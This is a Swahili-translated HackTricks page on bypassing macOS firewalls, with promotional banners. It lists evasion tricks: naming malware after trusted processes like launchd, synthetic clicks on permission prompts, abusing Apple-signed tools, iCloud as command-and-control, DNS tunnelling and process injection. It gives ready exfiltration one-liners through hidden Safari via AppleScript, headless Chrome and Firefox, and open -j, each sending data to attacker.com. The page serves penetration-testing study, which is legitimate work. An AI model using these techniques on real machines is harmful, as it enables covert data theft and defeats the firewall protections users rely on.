# Kupitisha Firewalls ya macOS

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mbinu Zilizopatikana

Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewall za macOS.

### Kutumia majina ya orodha nyeupe vibaya

* Kwa mfano kuita zisizo na programu hasidi kwa majina ya michakato inayojulikana ya macOS kama vile **`launchd`**

### Bonyeza Kisynthetic

* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya programu hasidi **ibonyeze ruhusa**

### **Tumia programu zilizosainiwa na Apple**

* Kama vile **`curl`**, lakini pia nyingine kama **`whois`**

### Vipeni vya Apple vinavyojulikana

Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vinavyojulikana kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Kupitisha Kwa Ujumla

Mawazo kadhaa ya jaribu kupitisha firewalls

### Angalia trafiki iliyoruhusiwa

Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu zipi zilizoruhusiwa kufikia vikoa hivyo.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS

Ufumbuzi wa DNS unafanywa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo labda itaruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia Programu za Kivinjari

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia sindano za michakato

Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua ulinzi wa firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Marejeo

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Jifunze & jifunze AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & jifunze GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
